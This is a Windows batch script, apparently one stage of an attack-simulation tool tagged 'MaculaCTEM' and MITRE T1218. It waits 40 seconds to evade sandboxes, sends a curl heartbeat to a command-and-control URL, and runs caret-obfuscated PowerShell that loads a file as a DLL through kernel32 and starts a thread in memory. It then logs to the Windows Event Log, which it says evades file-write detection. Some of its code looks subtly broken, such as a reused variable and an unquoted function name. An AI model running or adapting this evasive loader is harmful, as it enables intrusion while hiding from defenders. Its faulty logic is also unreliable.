@echo off
REM Random constant names with PHR_ as values
SET ahspql=%APPDATA%\8275\346d05f7
SET kqmzrt=Macula-Stage0-8275
SET vxbywr=https://10.0.0.49
SET ztqphn=https://10.0.0.49/stage/2/icon.png?8275-7
SET pmjnwl=BALAM-S2BO
SET yfbkcg=7
SET dtjrvg=mspaint.txt
SET snwvxh=8275

REM Initial delay to evade sandbox analysis
timeout /t 40 /nobreak >nul

REM Heartbeat to C2 - FIRST OPERATION AS REQUESTED
curl -k -s -o nul "%ztqphn%"

ping -n 6 127.0.0.1 >nul

REM Change to output directory
cd /d "%ahspql%" 2>nul

CHOICE /C Y /N /D Y /T 3 >nul

REM Execute DLL via PowerShell to avoid LOLBin detection patterns
SET /A rnd=%RANDOM% %% 1000
SET psvar1=p^o^w^e^r^s^h^e^l^l^.^e^x^e
SET psvar2=-^N^o^P^-^W^i^n^d^o^w^-^C^o^m^m^a^n^d
SET psvar3=Add-Type @^"
SET psvar4=[DllImport(
SET psvar5=kernel32.dll
SET psvar6=)]
SET psvar7=public static extern IntPtr LoadLibrary(string lpFileName);
SET psvar8=[DllImport(
SET psvar9=kernel32.dll
SET psvar10=)]
SET psvar11=public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
SET psvar12=[DllImport(
SET psvar13=kernel32.dll
SET psvar14=)]
SET psvar15=public static extern bool FreeLibrary(IntPtr hModule);
SET psvar16=[DllImport(
SET psvar17=kernel32.dll
SET psvar18=)]
SET psvar19=public static extern IntPtr GetModuleHandle(string lpModuleName);
SET psvar20=@^"
SET psvar21=; ^$^h^=^[^k^e^r^n^e^l^3^2^]^:^:^L^o^a^d^L^i^b^r^a^r^y^(^"
SET psvar22=); ^$^p^=^[^k^e^r^n^e^l^3^2^]^:^:^G^e^t^P^r^o^c^A^d^d^r^e^s^s^(^$^h^,^D^l^l^M^a^i^n^); ^i^f^(^$^p^-^n^e^$^n^u^l^l^)^{^$^d^e^l^=^[^k^e^r^n^e^l^3^2^]^:^:^G^e^t^M^o^d^u^l^e^H^a^n^d^l^e^(^k^e^r^n^e^l^3^2^.^d^l^l^); ^$^j^m^p^=^$^d^e^l^+^0^x^1^0^0^0^0^; ^[^S^y^s^t^e^m^.^R^u^n^t^i^m^e^.^I^n^t^e^r^o^p^S^e^r^v^i^c^e^s^.^M^a^r^s^h^a^l^]^:^:^W^r^i^t^e^I^n^t^P^t^r^(^$^j^m^p^,^$^p^,^$^t^r^u^e^); ^[^k^e^r^n^e^l^3^2^]^:^:^C^r^e^a^t^e^T^h^r^e^a^d^(^0^,^0^,^$^j^m^p^,^0^,^0^,^0^)^; ^}

REM Build and execute PowerShell in fragments to avoid string detection
%psvar1% %psvar2% %psvar3%%psvar4%%psvar5%%psvar6%%psvar7%%psvar8%%psvar9%%psvar10%%psvar11%%psvar8%%psvar12%%psvar13%%psvar14%%psvar15%%psvar8%%psvar16%%psvar17%%psvar18%%psvar19%%psvar20%%psvar21%%dtjrvg%%psvar22%

REM Random delay
SET /A delay=%RANDOM% %% 15 + 10
timeout /t %delay% /nobreak >nul

REM Build timestamp for TTP log (no file write, just variable)
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value') do set datetime=%%I
set timestamp=%datetime:~0,4%-%datetime:~4,2%-%datetime:~6,2% %datetime:~8,2%:%datetime:~10,2%:%datetime:~12,2%.%datetime:~15,3%

REM TTP logging via Windows Event Log instead of file (evades file write detection)
SET result=1
SET err_detail=
eventcreate /L INFORMATION /SO MaculaCTEM /T SUCCESS /ID %rnd% /D "%pmjnwl%: %yfbkcg%-%snwvxh%-T1218|Signed Binary Proxy Execution=%result%:%err_detail%" >nul 2>nul

ping -n 2 127.0.0.1 >nul